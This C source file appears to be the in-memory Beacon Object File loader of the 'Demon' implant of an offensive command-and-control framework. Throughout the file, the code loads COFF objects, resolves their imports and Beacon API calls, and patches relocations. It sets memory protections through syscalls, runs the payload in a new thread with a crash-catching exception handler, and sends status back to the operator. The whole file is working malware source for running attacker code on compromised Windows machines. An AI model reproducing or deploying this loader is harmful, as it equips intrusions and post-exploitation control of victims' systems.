
#include <Demon.h>

#include <Core/Win32.h>
#include <Core/MiniStd.h>
#include <Core/Package.h>
#include <Common/Macros.h>
#include <Inject/InjectUtil.h>
#include <Loader/CoffeeLdr.h>
#include <Loader/ObjectApi.h>

#if _WIN64
    // __imp_
    #define COFF_PREP_SYMBOL        0xec6ba2a8
    #define COFF_PREP_SYMBOL_SIZE   6
    // __imp_Beacon
    #define COFF_PREP_BEACON        0xd0a409b0
    #define COFF_PREP_BEACON_SIZE   ( COFF_PREP_SYMBOL_SIZE + 6 )
#else
    // __imp__
    #define COFF_PREP_SYMBOL        0x79dff807
    #define COFF_PREP_SYMBOL_SIZE   7
    // __imp__Beacon
    #define COFF_PREP_BEACON        0x4c20aa4f
    #define COFF_PREP_BEACON_SIZE   ( COFF_PREP_SYMBOL_SIZE + 6 )
#endif

PVOID CoffeeFunctionReturn = NULL;

LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )
{
    UINT32 RequestID = 0;
    PPACKAGE Package = NULL;

    PRINTF( "Exception: %p\n", Exception->ExceptionRecord->ExceptionCode )

    // Leave faulty function
#if _WIN64
    Exception->ContextRecord->Rip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;
#else
    Exception->ContextRecord->Eip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;
#endif

    // TODO: obtaining the RequestID this way is almost surely not correct
    //       given that CoffeeFunctionReturn won't point to BOF code but Demon code
    //       also, if two BOFs are running at the same time, this VEH impl won't work
    if ( GetRequestIDForCallingObjectFile( CoffeeFunctionReturn, &RequestID ) )
        Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, RequestID );
    else
        Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );

    PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_EXCEPTION );
    PackageAddInt32( Package, Exception->ExceptionRecord->ExceptionCode );
    PackageAddInt64( Package, (UINT64)(ULONG_PTR)Exception->ExceptionRecord->ExceptionAddress );
    PackageTransmit( Package );

    return EXCEPTION_CONTINUE_EXECUTION;
}

// check if the symbol is on the form: __imp_LIBNAME$FUNCNAME
BOOL SymbolIncludesLibrary( LPSTR Symbol )
{
    // does it start with __imp_?
    if ( HashEx( Symbol, COFF_PREP_SYMBOL_SIZE, FALSE ) != COFF_PREP_SYMBOL )
        return FALSE;

    // does it contain a $ (which separates DLL name and export name)
    SIZE_T Length = StringLengthA( Symbol );
    for (SIZE_T i = COFF_PREP_SYMBOL_SIZE + 1; i < Length - 1; ++i)
    {
        if ( Symbol[ i ] == '$' )
            return TRUE;
    }

    return FALSE;
}

BOOL SymbolIsImport( LPSTR Symbol )
{
    // does it start with __imp_?
    return HashEx( Symbol, COFF_PREP_SYMBOL_SIZE, FALSE ) == COFF_PREP_SYMBOL;
}

BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, PVOID* pFuncAddr )
{
    CHAR        Bak[ 1024 ]     = { 0 };
    CHAR        SymName[ 1024 ] = { 0 };
    PCHAR       SymLibrary      = NULL;
    PCHAR       SymFunction     = NULL;
    HMODULE     hLibrary        = NULL;
    DWORD       SymBeacon       = HashEx( SymbolName, COFF_PREP_BEACON_SIZE, FALSE );
    ANSI_STRING AnsiString      = { 0 };
    PPACKAGE    Package         = NULL;

    *pFuncAddr = NULL;

    MemCopy( Bak, SymbolName, StringLengthA( SymbolName ) + 1 );

    if ( SymBeacon == COFF_PREP_BEACON )
    {
        // this is an import symbol from Beacon: __imp_BeaconFUNCNAME
        SymFunction = SymbolName + COFF_PREP_SYMBOL_SIZE;

        for ( DWORD i = 0 ;; i++ )
        {
            if ( ! BeaconApi[ i ].NameHash )
                break;

            if ( HashStringA( SymFunction ) == BeaconApi[ i ].NameHash )
            {
                //PUTS( "Found Beacon api function" )
                *pFuncAddr = BeaconApi[ i ].Pointer;
                return TRUE;
            }
        }

        goto SymbolNotFound;
    }
    else if ( SymbolIsImport( SymbolName ) && ! SymbolIncludesLibrary( SymbolName ) )
    {
        // this is an import symbol without library: __imp_FUNCNAME
        SymFunction = SymbolName + COFF_PREP_SYMBOL_SIZE;

        StringCopyA( SymName, SymFunction );

#if _M_IX86
        // in x86, symbols can have this form: __imp__LoadLibraryA@4
        // we need to make sure there is no '@' in the function name
        for ( DWORD i = 0 ;; ++i )
        {
            if ( ! SymName[i] )
                break;

            if ( SymName[i] == '@' )
            {
                SymName[i] = 0;
                break;
            }
        }
#endif

        // we support a handful of functions that don't usually have the DLL
        for ( DWORD i = 0 ;; i++ )
        {
            if ( ! LdrApi[ i ].NameHash )
                break;

            if ( HashStringA( SymName ) == LdrApi[ i ].NameHash )
            {
                *pFuncAddr = LdrApi[ i ].Pointer;
                return TRUE;
            }
        }

        goto SymbolNotFound;
    }
    else if ( SymbolIsImport( SymbolName ) )
    {
        // this is a typical import symbol in the form: __imp_LIBNAME$FUNCNAME
        SymLibrary  = Bak + COFF_PREP_SYMBOL_SIZE;
        SymLibrary  = StringTokenA( SymLibrary, "$" );
        SymFunction = SymLibrary + StringLengthA( SymLibrary ) + 1;
        hLibrary    = LdrModuleLoad( SymLibrary );

        if ( ! hLibrary )
        {
            PRINTF( "Failed to load library: Lib:[%s] Err:[%d]\n", SymLibrary, NtGetLastError() );
            goto SymbolNotFound;
        }

        StringCopyA( SymName, SymFunction );

#if _M_IX86
        // in x86, symbols can have this form: __imp__KERNEL32$GetProcessHeap@0
        // we need to make sure there is no '@' in the function name
        for ( DWORD i = 0 ;; ++i )
        {
            if ( ! SymName[i] )
                break;

            if ( SymName[i] == '@' )
            {
                SymName[i] = 0;
                break;
            }
        }
#endif

        AnsiString.Length        = StringLengthA( SymName );
        AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
        AnsiString.Buffer        = SymName;

        if ( ! NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, pFuncAddr ) ) )
            goto SymbolNotFound;
    }
    else if ( SymbolType == SYMBOL_IS_A_FUNCTION)
    {
        // TODO: should we also fail if the symbol is not a function?
        goto SymbolNotFound;
    }

    return TRUE;

SymbolNotFound:
    Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, Coffee->RequestID );
    PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND );
    PackageAddString( Package, SymbolName );
    PackageTransmit( Package );

    return FALSE;
}

// This is our function where we can control/get the return address of it to use it in case of a Veh exception
VOID CoffeeFunction( PVOID Address, PVOID Argument, SIZE_T Size )
{
    VOID ( *Function ) ( PCHAR , ULONG ) = Address;

    CoffeeFunctionReturn = __builtin_extract_return_addr( __builtin_return_address ( 0 ) );

    // Execute our function
    Function( Argument, Size );

    PUTS( "Finished" )
}

BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE_T Size, UINT32 RequestID )
{
    PVOID CoffeeMain     = NULL;
    PVOID VehHandle      = NULL;
    PCHAR SymbolName     = NULL;
    BOOL  Success        = FALSE;
    ULONG FunctionLength = StringLengthA( Function );
    ULONG Protection     = 0;
    ULONG BitMask        = 0;

    if ( Instance.Config.Implant.CoffeeVeh )
    {
        PUTS( "Register VEH handler..." )
        // Add Veh Debugger in case that our BOF crashes etc.
        VehHandle = Instance.Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
        if ( ! VehHandle )
        {
            PACKAGE_ERROR_WIN32
            return FALSE;
        }
    }

    // set appropriate permissions for each section
    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
        if ( Coffee->Section->SizeOfRawData > 0 )
        {
            BitMask = Coffee->Section->Characteristics & ( IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE );
            if ( BitMask == 0 )
                Protection = PAGE_NOACCESS;
            else if ( BitMask == IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;
            else if ( BitMask == IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;
            else if ( BitMask == ( IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE ) )
                Protection = PAGE_EXECUTE_READ;
            else if ( BitMask == IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;
            else if ( BitMask == ( IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;
            else if ( BitMask == ( IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_READWRITE;
            else if ( BitMask == ( IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_READWRITE;
            else
            {
                PRINTF( "Unknown protection: %x", Coffee->Section->Characteristics );
                Protection = PAGE_EXECUTE_READWRITE;
            }

            if ( ( Coffee->Section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED ) == IMAGE_SCN_MEM_NOT_CACHED  )
                Protection |= PAGE_NOCACHE;

            Success = MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->SecMap[ SectionCnt ].Ptr, Coffee->SecMap[ SectionCnt ].Size, Protection );
            if ( ! Success )
            {
                PUTS( "Failed to protect memory" )
                return FALSE;
            }
        }
    }

    if ( Coffee->FunMapSize )
    {
        // set the FunctionMap section to READONLY
        Success = MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->FunMap, Coffee->FunMapSize, PAGE_READONLY );
        if ( ! Success )
        {
            PUTS( "Failed to protect memory" )
            return FALSE;
        }
    }

    // look for the "go" function
    for ( DWORD SymCounter = 0; SymCounter < Coffee->Header->NumberOfSymbols; SymCounter++ )
    {
        if ( Coffee->Symbol[ SymCounter ].First.Value[ 0 ] != 0 )
            SymbolName = Coffee->Symbol[ SymCounter ].First.Name;
        else
            SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Coffee->Symbol[ SymCounter ].First.Value[ 1 ];

#if _M_IX86
        // in x86, the "go" function might actaully be named _go
        if ( SymbolName[0] == '_' )
            SymbolName++;
#endif

        if ( MemCompare( SymbolName, Function, FunctionLength ) == 0 )
        {
            CoffeeMain = ( Coffee->SecMap[ Coffee->Symbol[ SymCounter ].SectionNumber - 1 ].Ptr + Coffee->Symbol[ SymCounter ].Value );
            break;
        }
    }

    // did we find it?
    if ( ! CoffeeMain )
    {
        PRINTF( "[!] Couldn't find function => %s\n", Function );

        PPACKAGE Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, RequestID );

        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND );
        PackageAddString( Package, Function );
        PackageTransmit( Package );

        return FALSE;
    }

    // make sure the entry point is on executable memory
    Success = FALSE;
    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        if ( ( ULONG_PTR ) CoffeeMain >= ( ULONG_PTR ) Coffee->SecMap[ SectionCnt ].Ptr && ( ULONG_PTR ) CoffeeMain < U_PTR( Coffee->SecMap[ SectionCnt ].Ptr) + Coffee->SecMap[ SectionCnt ].Size )
        {
            Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
            if ( ( Coffee->Section->Characteristics & IMAGE_SCN_MEM_EXECUTE ) == IMAGE_SCN_MEM_EXECUTE )
                Success = TRUE;

            break;
        }
    }

    if ( ! Success )
    {
        PRINTF( "The entry point (%p) is not on executable memory\n", CoffeeMain )
        return FALSE;
    }

    PUTS( "[*] Execute coffee main\n" );
    CoffeeFunction( CoffeeMain, Argument, Size );

    // Remove our exception handler
    if ( VehHandle ) {
        Instance.Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
    }

    return TRUE;
}

VOID CoffeeCleanup( PCOFFEE Coffee )
{
    PVOID    Pointer  = NULL;
    SIZE_T   Size     = 0;
    NTSTATUS NtStatus = 0;

    if ( ! Coffee || ! Coffee->ImageBase )
        return;

    if ( MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->ImageBase, Coffee->BofSize, PAGE_READWRITE ) )
        MemSet( Coffee->ImageBase, 0, Coffee->BofSize );

    Pointer = Coffee->ImageBase;
    Size    = Coffee->BofSize;
    if ( ! NT_SUCCESS( ( NtStatus = SysNtFreeVirtualMemory( NtCurrentProcess(), &Pointer, &Size, MEM_RELEASE ) ) ) )
    {
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        PRINTF( "[!] Failed to free memory: %p : %lu\n", Coffee->ImageBase, NtGetLastError() );
    }

    if ( Coffee->SecMap )
    {
        MemSet( Coffee->SecMap, 0, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
        Instance.Win32.LocalFree( Coffee->SecMap );
        Coffee->SecMap = NULL;
    }
}

// Process sections relocation and symbols
BOOL CoffeeProcessSections( PCOFFEE Coffee )
{
    PUTS( "Process Sections" )
    PVOID  FuncPtr           = NULL;
    DWORD  FuncCount         = 0;
    UINT64 OffsetLong        = 0;
    UINT32 Offset            = 0;
    CHAR   SymName[9]        = { 0 };
    PCHAR  SymbolName        = NULL;
    PVOID  RelocAddr         = NULL;
    PVOID  FunMapAddr        = NULL;
    PVOID  SymbolSectionAddr = NULL;
    UINT16 SymbolType        = 0;
    PCOFF_SYMBOL Symbol      = NULL;

    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
        Coffee->Reloc   = C_PTR( U_PTR( Coffee->Data ) + Coffee->Section->PointerToRelocations );

        for ( DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++ )
        {
            Symbol = &Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ];

            if ( Symbol->First.Value[ 0 ] != 0 )
            {
                // if the symbol is 8 bytes long, it will not be terminated by a null byte
                MemSet( SymName, 0, sizeof( SymName ) );
                MemCopy( SymName, Symbol->First.Name, 8 );
                SymbolName = SymName;
                // TODO: the following symbols take 2 entries: .text, .xdata, .pdata, .rdata
                //       skip an entry if one of those is found
            }
            else
            {
                // in this scenario, we can trust that the symbol ends with a null byte
                SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Symbol->First.Value[ 1 ];
            }

            // address where the reloc must be written to
            RelocAddr = Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress;
            // address where the resolved function address will be stored
            FunMapAddr = Coffee->FunMap + ( FuncCount * sizeof( PVOID ) );
            // the address of the section where the symbol is stored
            SymbolSectionAddr = Coffee->SecMap[ Symbol->SectionNumber - 1 ].Ptr;
            // type of the symbol
            SymbolType = Symbol->Type;

            if ( ! CoffeeProcessSymbol( Coffee, SymbolName, SymbolType, &FuncPtr ) )
            {
                PRINTF( "Symbol '%s' couldn't be resolved\n", SymbolName );
                return FALSE;
            }

#if _WIN64
            if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr != NULL )
            {
                *( ( PVOID* ) FunMapAddr ) = FuncPtr;

                Offset = ( UINT32 ) ( U_PTR( FunMapAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) );

                *( ( PUINT32 ) RelocAddr ) = Offset;

                FuncCount++;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 );

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_1 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 1;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_2 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 2;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_3 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 3;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_4 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 4;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_5 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 5;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR32NB && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 );

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64 && FuncPtr == NULL )
            {
                OffsetLong = *( PUINT64 ) ( RelocAddr );

                OffsetLong += U_PTR( SymbolSectionAddr );

                *( ( PUINT64 ) RelocAddr ) = OffsetLong;
            }
#else
                if ( Coffee->Reloc->Type == IMAGE_REL_I386_REL32 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 );

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr != NULL )
            {
                *( ( PVOID* ) FunMapAddr ) = FuncPtr;

                Offset = U_PTR( FunMapAddr );

                *( ( PUINT32 ) RelocAddr ) = Offset;

                FuncCount++;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr );

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
#endif
            else
            {
                if ( FuncPtr )
                {
                    PRINTF( "[!] Relocation type %d for Symbol %s not supported\n", Coffee->Reloc->Type, SymbolName );
                }
                else
                {
                    PRINTF( "[!] Relocation type not found: %d\n", Coffee->Reloc->Type );
                }

                return FALSE;
            }

            Coffee->Reloc = C_PTR( U_PTR( Coffee->Reloc ) + sizeof( COFF_RELOC ) );
        }
    }

    return TRUE;
}

// calculate how many __imp_* function there are
SIZE_T CoffeeGetFunMapSize( PCOFFEE Coffee )
{
    CHAR         SymName[9]    = { 0 };
    PCHAR        SymbolName    = NULL;
    ULONG        NumberOfFuncs = 0;
    PCOFF_SYMBOL Symbol        = NULL;

    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
        Coffee->Reloc   = C_PTR( U_PTR( Coffee->Data ) + Coffee->Section->PointerToRelocations );

        for ( DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++ )
        {
            Symbol = &Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ];

            if ( Symbol->First.Value[ 0 ] != 0 )
            {
                // if the symbol is 8 bytes long, it will not be terminated by a null byte
                MemSet( SymName, 0, sizeof( SymName ) );
                MemCopy( SymName, Symbol->First.Name, 8 );
                SymbolName = SymName;
            }
            else
            {
                // in this scenario, we can trust that the symbol ends with a null byte
                SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Symbol->First.Value[ 1 ];
            }

            // if the symbol starts with __imp_, count it
            if ( HashEx( SymbolName, COFF_PREP_SYMBOL_SIZE, FALSE ) == COFF_PREP_SYMBOL )
                NumberOfFuncs++;

            Coffee->Reloc = C_PTR( U_PTR( Coffee->Reloc ) + sizeof( COFF_RELOC ) );
        }
    }

    return sizeof( PVOID ) * NumberOfFuncs;
}

VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )
{
    PCOFFEE Entry = Instance.Coffees;
    PCOFFEE Last  = Entry;

    if ( ! Coffee )
        return;

    if ( Entry && Entry->RequestID == Coffee->RequestID )
    {
        Instance.Coffees = Entry->Next;
        return;
    }

    Entry = Entry->Next;
    while ( Entry )
    {
        if ( Entry->RequestID == Coffee->RequestID )
        {
            Last->Next = Entry->Next;
            return;
        }

        Last  = Entry;
        Entry = Entry->Next;
    }

    PUTS( "Coffe entry was not found" )
}

VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
{
    PCOFFEE Coffee   = NULL;
    PVOID   NextBase = NULL;
    BOOL    Success  = FALSE;

    PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData, ArgData, ArgSize )

    if ( ! CoffeeData )
    {
        PUTS( "[!] Coffee data is empty" );
        goto END;
    }

    /*
     * The BOF will be allocated as one big chunk of memory
     * all sections are kept page aligned
     * the FunctionMap stored at the end to prevent
     * reloc 32-bit offsets to overflow
     */

    Coffee            = Instance.Win32.LocalAlloc( LPTR, sizeof( COFFEE ) );
    Coffee->Data      = CoffeeData;
    Coffee->Header    = Coffee->Data;
    Coffee->Symbol    = C_PTR( U_PTR( Coffee->Data ) + Coffee->Header->PointerToSymbolTable );
    Coffee->RequestID = RequestID;
    Coffee->Next      = Instance.Coffees;
    Instance.Coffees  = Coffee;

#if _WIN64

    if ( Coffee->Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
    {
        PUTS( "The BOF is not AMD64" );
        goto END;
    }

#else

    if ( Coffee->Header->Machine == IMAGE_FILE_MACHINE_AMD64 )
    {
        PUTS( "The BOF is AMD64" );
        goto END;
    }

#endif

    Coffee->SecMap     = Instance.Win32.LocalAlloc( LPTR, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
    Coffee->FunMapSize = CoffeeGetFunMapSize( Coffee );

    if ( ! Coffee->SecMap )
    {
        PUTS( "Failed to allocate memory" )
        goto END;
    }

    // calculate the size of the entire BOF
    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee->Header->NumberOfSections; SecCnt++ )
    {
        Coffee->Section  = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
        Coffee->BofSize += Coffee->Section->SizeOfRawData;
        Coffee->BofSize  = ( SIZE_T ) ( ULONG_PTR ) PAGE_ALLIGN( Coffee->BofSize );
    }

    // at the bottom of the BOF, store the Function map, to ensure all reloc offsets are below 4K
    Coffee->BofSize += Coffee->FunMapSize;

    Coffee->ImageBase = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Coffee->BofSize, PAGE_READWRITE );
    if ( ! Coffee->ImageBase )
    {
        PUTS( "Failed to allocate memory for the BOF" )
        goto END;
    }

    NextBase = Coffee->ImageBase;
    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee->Header->NumberOfSections; SecCnt++ )
    {
        Coffee->Section               = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
        Coffee->SecMap[ SecCnt ].Size = Coffee->Section->SizeOfRawData;
        Coffee->SecMap[ SecCnt ].Ptr  = NextBase;

        NextBase += Coffee->Section->SizeOfRawData;
        NextBase  = PAGE_ALLIGN( NextBase );

        PRINTF( "Coffee->SecMap[ %d ].Ptr => %p\n", SecCnt, Coffee->SecMap[ SecCnt ].Ptr )

        MemCopy( Coffee->SecMap[ SecCnt ].Ptr, C_PTR( U_PTR( CoffeeData ) + Coffee->Section->PointerToRawData ), Coffee->Section->SizeOfRawData );
    }

    // the FunMap is stored directly after the BOF
    Coffee->FunMap = NextBase;

    if ( ! CoffeeProcessSections( Coffee ) )
    {
        PUTS( "[*] Failed to process relocation" );
        goto END;
    }

    Success = CoffeeExecuteFunction( Coffee, EntryName, ArgData, ArgSize, RequestID );

END:
    PUTS( "[*] Cleanup memory" );
    CoffeeCleanup( Coffee );

    if ( Success )
    {
        PPACKAGE Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, RequestID );
        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_RAN_OK );
        PackageTransmit( Package );
    }
    else
    {
        PPACKAGE Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, RequestID );
        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_COULD_NO_RUN );
        PackageTransmit( Package );
    }

    RemoveCoffeeFromInstance( Coffee );

    if ( Coffee )
    {
        MemSet( Coffee, 0, sizeof( Coffee ) );
        Instance.Win32.LocalFree( Coffee );
        Coffee = NULL;
    }
}

VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
{
    if ( ! Param->EntryName || ! Param->CoffeeData )
        goto ExitThread;

    CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize, Param->RequestID );

ExitThread:
    if ( Param )
    {
        DATA_FREE( Param->EntryName,  Param->EntryNameSize );
        DATA_FREE( Param->CoffeeData, Param->CoffeeDataSize );
        DATA_FREE( Param->ArgData,    Param->ArgSize );
        DATA_FREE( Param,             sizeof( COFFEE_PARAMS ) );
    }

    JobRemove( (DWORD)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueThread );
    Instance.Threads--;

    Instance.Win32.RtlExitUserThread( 0 );
}

VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
{
    PCOFFEE_PARAMS CoffeeParams = NULL;
    INJECTION_CTX  InjectionCtx = { 0 };
#if _WIN64
    BOOL           x64          = TRUE;
#else
    BOOL           x64          = FALSE;
#endif

    // Allocate memory
    CoffeeParams                 = Instance.Win32.LocalAlloc( LPTR, sizeof( COFFEE_PARAMS ) );
    CoffeeParams->EntryName      = Instance.Win32.LocalAlloc( LPTR, EntryNameSize );
    CoffeeParams->CoffeeData     = Instance.Win32.LocalAlloc( LPTR, CoffeeDataSize );
    CoffeeParams->ArgData        = Instance.Win32.LocalAlloc( LPTR, ArgSize );
    CoffeeParams->EntryNameSize  = EntryNameSize;
    CoffeeParams->CoffeeDataSize = CoffeeDataSize;
    CoffeeParams->ArgSize        = ArgSize;
    CoffeeParams->RequestID      = RequestID;

    MemCopy( CoffeeParams->EntryName,  EntryName,  EntryNameSize  );
    MemCopy( CoffeeParams->CoffeeData, CoffeeData, CoffeeDataSize );
    MemCopy( CoffeeParams->ArgData,    ArgData,    ArgSize        );

    InjectionCtx.Parameter = CoffeeParams;

    Instance.Threads++;

    if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, NtCurrentProcess(), x64, CoffeeRunnerThread, CoffeeParams, NULL ) ) {
        PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
        PACKAGE_ERROR_WIN32
    }
}